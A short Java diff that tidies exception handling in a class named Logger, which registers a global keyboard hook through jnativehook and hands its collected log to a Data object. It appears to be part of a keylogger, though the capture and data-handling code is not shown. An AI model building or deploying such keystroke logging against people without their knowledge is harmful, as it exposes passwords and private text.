@@ -4,7 +4,6 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 import java.io.IOException;
-import java.util.concurrent.ExecutionException;
 
 public class Logger implements NativeKeyListener {
 
@@ -25,7 +24,7 @@ public class Logger implements NativeKeyListener {
             try {
                 GlobalScreen.unregisterNativeHook();
                 new Data(log);
-            } catch (IOException | ExecutionException | InterruptedException | NativeHookException ex) {
+            } catch (IOException | NativeHookException ex) {
                 ex.printStackTrace();
             }
         }
